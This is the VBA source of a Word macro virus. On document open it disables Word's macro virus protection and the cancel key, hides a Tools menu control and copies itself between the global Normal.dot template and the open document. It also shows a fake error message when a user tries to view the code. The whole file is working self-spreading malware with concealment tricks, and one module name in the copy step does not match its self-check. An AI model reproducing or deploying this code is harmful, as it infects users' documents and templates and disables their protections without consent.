Attribute VB_Name = "Virus2"
Sub AutoOpen()
Application.EnableCancelKey = False 'Prodection
Options.VirusProtection = False     'Prodection
Application.CommandBars("Tools").Controls(12).Enabled = False 'Stealth
If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Virus2" Then GoTo EndOfVirus
    Next i
   VSource = NormalTemplate.FullName
    VDestiny = ActiveDocument.FullName
Else
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "Virus2" Then GoTo EndOfVirus
    Next i
    VSource = ActiveDocument.FullName
    VDestiny = NormalTemplate.FullName
End If
Application.OrganizerCopy VSource, VDestiny, "ExampleVirus", wdOrganizerObjectProjectItems
EndOfVirus:
End Sub

Sub ViewVBCode()
MsgBox "Error: 8934", vbExclamation, "VB Editor"    'Display a false error message
End Sub
